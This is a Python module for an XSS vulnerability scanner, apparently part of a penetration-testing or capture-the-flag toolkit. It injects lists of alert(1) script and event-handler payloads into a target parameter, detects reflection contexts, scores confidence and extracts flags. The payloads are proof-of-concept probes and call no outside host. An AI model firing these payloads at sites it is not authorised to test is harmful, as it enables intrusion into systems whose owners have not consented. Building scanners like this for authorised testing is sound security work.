"""XSS (Cross-Site Scripting) scanner module."""

import asyncio
import re
import html
from typing import Optional, Callable
from pathlib import Path

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...core.context_analyzer import ContextAnalyzer, ReflectionType
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Default XSS payloads
DEFAULT_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '<a href="javascript:alert(1)">click</a>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
]

# Patterns indicating XSS reflection
XSS_REFLECTION_PATTERNS = [
    r'<script[^>]*>.*?</script>',
    r'on\w+\s*=',
    r'javascript:',
    r'<img[^>]+onerror',
    r'<svg[^>]+onload',
    r'<body[^>]+onload',
    r'<iframe[^>]+src\s*=\s*["\']?javascript:',
]

# Context type to human-readable name mapping
CONTEXT_NAMES = {
    ReflectionType.HTML_TEXT: "HTML Body",
    ReflectionType.HTML_ATTRIBUTE: "Attribute (quoted)",
    ReflectionType.HTML_ATTRIBUTE_UNQUOTED: "Attribute (unquoted)",
    ReflectionType.JAVASCRIPT: "JavaScript String",
    ReflectionType.JAVASCRIPT_UNQUOTED: "JavaScript",
    ReflectionType.URL: "URL/href",
    ReflectionType.CSS: "CSS/Style",
    ReflectionType.COMMENT: "HTML Comment",
    ReflectionType.NONE: "Unknown",
}


class XssScanner(AttackModule):
    """XSS vulnerability scanner."""

    @property
    def name(self) -> str:
        return "XSS Scanner"

    @property
    def description(self) -> str:
        return "Scans for Cross-Site Scripting vulnerabilities"

    def __init__(self, ctx: AttackContext, xss_type: str = "reflected"):
        """
        Initialize XSS scanner.

        Args:
            ctx: Attack context
            xss_type: Type of XSS (reflected, stored, dom)
        """
        super().__init__(ctx)
        self.xss_type = xss_type
        self.flag_extractor = FlagExtractor()
        self.context_analyzer = ContextAnalyzer()
        self.vulnerable_payloads: list[dict] = []
        self.reflection_contexts: list[str] = []
        self.initial_contexts: list[ReflectionType] = []

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None
    ) -> list[dict]:
        """
        Scan target for XSS vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found

        Returns:
            List of findings
        """
        if payloads is None:
            payloads = self._get_default_payloads()

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} XSS payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")

        # Setup baseline
        await self.setup()

        # Detect reflection context using ContextAnalyzer
        await self._detect_context()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for XSS...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"]
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads()

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} XSS payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for XSS...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _detect_context(self) -> None:
        """Detect where input is reflected using ContextAnalyzer."""
        probe = ContextAnalyzer.PROBE_MARKER
        response = await self.client.request_with_payload(probe)

        contexts = []
        context_types = []

        if probe in response.text:
            # Use ContextAnalyzer for precise detection
            analysis = self.context_analyzer.analyze_reflection(response.text, probe)
            context_types = list(analysis.unique_contexts)

            # Convert to legacy format for compatibility
            for ctx_type in context_types:
                if ctx_type == ReflectionType.HTML_TEXT:
                    contexts.append("html_body")
                elif ctx_type in [ReflectionType.HTML_ATTRIBUTE, ReflectionType.HTML_ATTRIBUTE_UNQUOTED]:
                    contexts.append("attribute")
                elif ctx_type in [ReflectionType.JAVASCRIPT, ReflectionType.JAVASCRIPT_UNQUOTED]:
                    contexts.append("javascript")
                elif ctx_type == ReflectionType.URL:
                    contexts.append("url")
                elif ctx_type == ReflectionType.COMMENT:
                    contexts.append("comment")

        self.reflection_contexts = contexts if contexts else ["unknown"]
        self.initial_contexts = context_types

        if self.ctx.verbose:
            context_names = [CONTEXT_NAMES.get(c, str(c)) for c in context_types]
            log_info(f"Detected reflection contexts: {context_names}")

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single XSS payload asynchronously."""
        try:
            response = await self.client.request_with_payload(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check if payload is reflected
            is_vulnerable, evidence, reflection_location = self._check_reflection_with_context(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"XSS ({self.xss_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(payload, response),
                    "context": self.reflection_contexts,
                    "reflection_location": reflection_location,
                    "flags_found": flags,
                    "response_length": response.content_length,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing XSS payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response = self.client.request_with_payload_sync(payload)

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, reflection_location = self._check_reflection_with_context(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"XSS ({self.xss_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(payload, response),
                    "context": self.reflection_contexts,
                    "reflection_location": reflection_location,
                    "flags_found": flags,
                }
                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing XSS payload: {e}")

        return None

    def _check_reflection_with_context(self, response: Response, payload: str) -> tuple[bool, str, str]:
        """
        Check if XSS payload is reflected and determine exact location.

        Returns:
            Tuple of (is_vulnerable, evidence, reflection_location)
        """
        text = response.text
        reflection_location = "Unknown"

        # Check exact reflection (no encoding)
        if payload in text:
            # Analyze where the payload is reflected
            analysis = self.context_analyzer.analyze_reflection(text, payload)

            if analysis.reflections:
                # Get the most significant reflection
                best = analysis.most_exploitable
                if best:
                    reflection_location = CONTEXT_NAMES.get(best.context_type, str(best.context_type))

                    # Add more detail if available
                    if best.attribute_name:
                        reflection_location = f"{reflection_location} ({best.attribute_name})"
                    if best.tag_name:
                        reflection_location = f"<{best.tag_name}> {reflection_location}"

            return True, f"Payload reflected in: {reflection_location}", reflection_location

        # Check for partial reflection of dangerous patterns
        for pattern in XSS_REFLECTION_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                # Verify it's related to our payload
                payload_parts = re.findall(r'<[^>]+>|on\w+=|javascript:', payload, re.IGNORECASE)
                for part in payload_parts:
                    if part.lower() in text.lower():
                        # Determine location based on pattern
                        if 'script' in pattern:
                            reflection_location = "Script Tag"
                        elif 'on' in pattern:
                            reflection_location = "Event Handler"
                        elif 'javascript' in pattern:
                            reflection_location = "JavaScript URL"
                        else:
                            reflection_location = "HTML Element"

                        return True, f"Dangerous pattern in {reflection_location}: {part}", reflection_location

        # Check if HTML-encoded payload is present (potentially safe)
        encoded_payload = html.escape(payload)
        if encoded_payload in text and payload != encoded_payload:
            return False, "Payload is HTML encoded (potentially safe)", "Encoded"

        return False, "", ""

    def _check_reflection(self, response: Response, payload: str) -> tuple[bool, str]:
        """Legacy method - Check if XSS payload is reflected in response."""
        is_vuln, evidence, _ = self._check_reflection_with_context(response, payload)
        return is_vuln, evidence

    def _calculate_confidence(self, payload: str, response: Response) -> str:
        """Calculate confidence level of finding."""
        text = response.text

        # High confidence: exact reflection with script/event handler
        if payload in text:
            if '<script' in payload.lower() or 'on' in payload.lower():
                return "high"

        # Medium confidence: partial reflection
        for pattern in XSS_REFLECTION_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return "medium"

        return "low"

    def _get_default_payloads(self) -> list[str]:
        """Get default XSS payloads."""
        payloads = DEFAULT_XSS_PAYLOADS.copy()

        # Add context-specific payloads
        if "attribute" in self.reflection_contexts:
            payloads.extend([
                '" onmouseover="alert(1)"',
                "' onmouseover='alert(1)'",
                '" onfocus="alert(1)" autofocus="',
            ])
        if "javascript" in self.reflection_contexts:
            payloads.extend([
                "';alert(1)//",
                '";alert(1)//',
                "</script><script>alert(1)</script>",
            ])

        return payloads

    def get_context_payloads(self, context: str) -> list[str]:
        """Get payloads specific to a reflection context."""
        context_payloads = {
            "html_body": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
            ],
            "attribute": [
                '" onmouseover="alert(1)"',
                "' onclick='alert(1)'",
                '" autofocus onfocus="alert(1)"',
            ],
            "javascript": [
                "';alert(1)//",
                '";alert(1)//',
                '-alert(1)-',
            ],
            "html_tag": [
                '><script>alert(1)</script>',
                ' onmouseover=alert(1)',
                '/><img src=x onerror=alert(1)>',
            ],
        }
        return context_payloads.get(context, DEFAULT_XSS_PAYLOADS)
